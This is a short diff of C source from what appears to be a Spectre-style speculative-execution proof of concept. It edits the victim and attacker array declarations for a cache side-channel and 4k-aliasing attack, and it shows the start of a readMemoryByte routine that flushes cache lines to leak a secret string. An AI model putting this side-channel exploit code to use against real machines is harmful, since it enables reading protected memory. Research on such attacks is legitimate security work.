@@ -16,31 +16,16 @@ Victim code.
 unsigned int array1_size = 2048;
 uint64_t times[4096];
 uint8_t unused1[64];
-__attribute__((aligned(4096))) uint8_t array1[2048] = {
-  1,
-  2,
-  3,
-  4,
-  5,
-  6,
-  7,
-  8,
-  9,
-  10,
-  11,
-  12,
-  13,
-  14,
-  15,
-  16
-};
+//array1 the attacker does not have access.
+__attribute__((aligned(4096))) uint8_t array1[2048];
 uint8_t unused2[64];
+//array2 the attacker has access to and will be used for the cache side-channel.
 uint8_t array2[256 * 512];
 uint8_t unused3[64];
-//Array3 the attacker has access to and will be used for 4k Aliasing
+//array3 the attacker has access to and will be used for 4k Aliasing
 __attribute__((aligned(4096))) uint8_t array3[2048];
 uint8_t unused4[64];
-//Array4 the attacker has access to and will be used to get array1 offset
+//array4 the attacker has access to and will be used to get array1 offset
 __attribute__((aligned(4096))) char array4[4096];
 
 char* secret = "The password is rootkea" ;
@@ -58,12 +43,12 @@ Analysis code
 void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
   static int results[256];
   int tries, i, j, k, mix_i, junk = 0;
-  size_t x;
   register uint64_t time1, time2;
   volatile uint8_t * addr;
 
   for (i = 0; i < 256; i++)
     results[i] = 0;
+
   for (tries = 999; tries > 0; tries--) {
 
     /* Flush array2[256*(0..255)] from cache */
